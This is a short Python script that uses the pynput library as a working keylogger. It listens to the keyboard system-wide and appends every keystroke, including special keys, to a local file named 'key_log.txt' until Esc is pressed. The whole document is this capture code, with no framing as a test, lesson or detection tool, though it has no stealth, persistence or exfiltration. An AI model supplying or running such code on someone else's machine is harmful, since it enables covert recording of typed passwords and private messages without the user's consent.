from pynput import keyboard

# The log file where keystrokes will be saved
log_file = "key_log.txt"

# Function to handle key press events
def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        # Special keys (e.g., space, enter, shift) have no 'char' attribute
        with open(log_file, "a") as log:
            log.write(f"{key}")

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
